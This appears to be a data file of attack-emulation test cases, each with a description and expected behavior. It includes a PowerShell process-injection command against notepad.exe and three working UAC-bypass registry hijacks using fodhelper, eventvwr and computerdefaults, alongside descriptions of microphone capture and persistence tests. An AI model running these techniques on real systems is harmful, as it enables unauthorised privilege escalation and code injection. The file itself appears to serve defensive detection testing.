attacks.expected_behavior: Creates %TEMP%\vbs_test.txt via hidden PowerShell execution from VBScript

attacks.description: Basic scripting attack: creates a simple shell script and executes it
attacks.expected_behavior: Creates a script file in /tmp, makes it executable, and runs it. Output: 'Test execution from script'

attacks.command:
cat << 'EOF' > /tmp/staged_script.sh
#!/bin/bash
echo "Staged payload execution"
ps aux | grep bash
EOF
chmod +x /tmp/staged_script.sh && /tmp/staged_script.sh
attacks.description: Intermediate scripting attack: uses heredoc to write a multi-line script that performs basic reconnaissance
attacks.expected_behavior: Writes a multi-line script using heredoc, makes it executable, and runs it. Output includes a message and lists processes containing 'bash'

attacks.description: Advanced scripting attack: decodes a base64-encoded script and executes it
attacks.expected_behavior: Decodes a base64 string (content: 'echo "Encoded script execution"') into a script file, makes it executable, and runs it. Output: 'Encoded script execution'

attacks.description: Basic audio capture using PowerSploit/Get-MicrophoneAudio
attacks.expected_behavior: Records 10 seconds of microphone audio and saves it to a temporary location

attacks.description: Intermediate audio capture with custom sample rate
attacks.expected_behavior: Records 30 seconds of microphone audio with a sample rate of 44100 and saves it to a temporary location

attacks.description: Advanced audio capture with custom sample rate and bit depth
attacks.expected_behavior: Records 60 seconds of microphone audio with a sample rate of 48000 and a bit depth of 16, and saves it to a temporary location

attacks.description: Execute Notepad via PowerShell using encoded command
attacks.expected_behavior: Launches Notepad process via encoded command

attacks.description: Create and open a file in TEMP using PowerShell
attacks.expected_behavior: Creates test.txt in TEMP directory and opens it with default handler

attacks.description: Create persistent scheduled task via PowerShell
attacks.expected_behavior: Creates scheduled task 'SafeTask' to write test file at user logon

attacks.description: Basic DLL injection using rundll32 to execute MessageBoxA from user32.dll.
attacks.expected_behavior: A message box titled "Info" with the text "Process Injection Test" appears, indicating that code from the DLL was executed in a new process.

attacks.description: Intermediate injection: creates an empty dummy DLL in %TEMP% and loads it with regsvr32, demonstrating DLL registration injection.
attacks.expected_behavior: regsvr32 attempts to load the dummy DLL; it will fail with an error dialog, but the command shows the injection attempt via a legitimate Windows utility.

attacks.command: powershell -NoProfile -ExecutionPolicy Bypass -Command \"$proc = Get-Process notepad -ErrorAction SilentlyContinue; if ($null -eq $proc) { Start-Process notepad.exe; Start-Sleep -Seconds 1; $proc = Get-Process notepad }; $pid = $proc.Id; Add-Type -TypeDefinition @\"using System;using System.Runtime.InteropServices;public class Injector{[DllImport('kernel32')]public static extern IntPtr OpenProcess(int dwDesiredAccess,bool bInheritHandle,int dwProcessId);[DllImport('kernel32')]public static extern IntPtr VirtualAllocEx(IntPtr hProcess,IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);[DllImport('kernel32')]public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] buffer,uint size,out IntPtr lpNumberOfBytesWritten);public static void Inject(int pid){IntPtr h=OpenProcess(0x001F0FFF,false,pid);string msg=\"Injected!\";byte[] bytes=System.Text.Encoding.ASCII.GetBytes(msg+\"\\0\");IntPtr addr=VirtualAllocEx(h,IntPtr.Zero,(uint)bytes.Length,0x3000,0x40);WriteProcessMemory(h,addr,bytes,(uint)bytes.Length,out _);}}\"@; [Injector]::Inject($pid)\"
attacks.description: Advanced reflective injection: compiles a C# injector via PowerShell Add-Type and uses WinAPI calls to allocate memory and write a benign string into the notepad process.
attacks.expected_behavior: The injector writes the string "Injected!" into the memory space of notepad.exe. No visible effect, but the operation demonstrates remote memory manipulation indicative of process injection.

attacks.command: reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c echo UAC Bypass > %TEMP%\bypass.txt" /f && start "" "C:\Windows\System32\fodhelper.exe"
attacks.description: Basic UAC bypass using fodhelper.exe by hijacking the ms-settings protocol handler in HKCU registry.
attacks.expected_behavior: Creates a registry entry that points to cmd.exe, then launches fodhelper.exe which runs the command with elevated privileges, resulting in a file %TEMP%\bypass.txt containing the test string.

attacks.command: reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c echo UAC Bypass > %TEMP%\bypass_msc.txt" /f && start "" "C:\Windows\System32\eventvwr.exe"
attacks.description: Intermediate UAC bypass using eventvwr.exe by hijacking the .msc file handler in HKCU registry.
attacks.expected_behavior: Adds a registry key that redirects .msc file execution to cmd.exe, then runs eventvwr.exe which triggers the command with elevated rights, creating %TEMP%\bypass_msc.txt.

attacks.command: reg add "HKCU\Software\Classes\exefile\shell\open\command" /ve /t REG_SZ /d "cmd.exe /c echo UAC Bypass > %TEMP%\bypass_exe.txt" /f && start "" "C:\Windows\System32\computerdefaults.exe"
attacks.description: Advanced UAC bypass using computerdefaults.exe by hijacking the exefile handler in HKCU registry.
attacks.expected_behavior: Registers a command under the exefile class that points to cmd.exe, then launches computerdefaults.exe which runs the payload with elevated privileges, resulting in %TEMP%\bypass_exe.txt.

attacks.description: Basic network share and domain computer enumeration
attacks.expected_behavior: Lists all computers in the current domain and their shared resources

attacks.description: Intermediate service configuration query for DHCP service
attacks.expected_behavior: Displays detailed service information including PID and status for DHCP client service

attacks.description: Advanced port testing for common services (HTTP/HTTPS/SMB)
attacks.expected_behavior: Tests connectivity to specified ports on localhost, showing open/listening services

attacks.description: Create a simple text file and archive it into a ZIP file using the built‑in tar utility.
attacks.expected_behavior: A file named sample.txt containing 'TestData' is created in %TEMP%, then tar creates sample.zip containing that file. No elevated rights are needed.

attacks.description: Generate a test file and compress it into a ZIP archive using PowerShell's Compress-Archive cmdlet.
attacks.expected_behavior: sample.txt is written to the user's TEMP folder, then Compress-Archive creates archive.zip containing the file. The operation succeeds without admin rights.

attacks.description: Create a test file and package it into a CAB archive using the legacy makecab utility.
attacks.expected_behavior: A file sample.txt with content 'SampleData' is placed in %TEMP%, then makecab creates archive.cab containing that file. No admin privileges are required.

attacks.description: Basic example of archiving a directory using tar.
attacks.expected_behavior: Creates a compressed archive named 'archive.tar.gz' containing the files from the 'Documents' directory.

attacks.description: Intermediate example archiving multiple directories.
attacks.expected_behavior: Creates a compressed archive named 'archive.tar.gz' in the '/tmp' directory containing files from both 'Documents' and 'Pictures' directories.

attacks.description: Advanced example using find to archive specific files.
attacks.expected_behavior: Finds all '.txt' files in the user's home directory and appends them to an archive named 'archive.tar'.
